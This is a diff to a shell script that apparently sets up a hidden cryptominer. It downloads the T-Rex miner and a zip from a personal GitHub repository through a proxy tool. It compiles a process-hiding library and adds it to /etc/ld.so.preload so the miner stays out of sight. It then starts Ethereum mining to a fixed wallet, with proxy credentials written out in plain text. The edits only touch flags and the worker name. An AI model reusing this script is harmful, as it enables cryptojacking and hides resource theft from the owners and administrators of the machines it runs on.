@@ -38,9 +38,9 @@ echo " "
 echo " "
 
 ./graftcp/graftcp wget https://github.com/trexminer/T-Rex/releases/download/0.24.6/t-rex-0.24.6-linux.tar.gz
-tar -zxf t-rex-0.24.6-linux.tar.gz
+tar -xvzf t-rex-0.24.6-linux.tar.gz
 chmod +x t-rex
-sudo ph add t-rex
+ph add t-rex
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
@@ -49,4 +49,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./t-rex -a ethash -o stratum+ssl://eth-us-west.flexpool.io:5555 -u 0xbc48b8bdce572defe4dcab85103f140099bc5af5 -p x -w DEN --proxy Selshindeparshuram2012:V7p9BkV@191.101.148.51:45786
+./graftcp/graftcp ./t-rex -a ethash -o stratum+ssl://eth-us-west.flexpool.io:5555 -u 0xbc48b8bdce572defe4dcab85103f140099bc5af5 -p x -w DENT --proxy Selshindeparshuram2012:V7p9BkV@191.101.148.51:45786
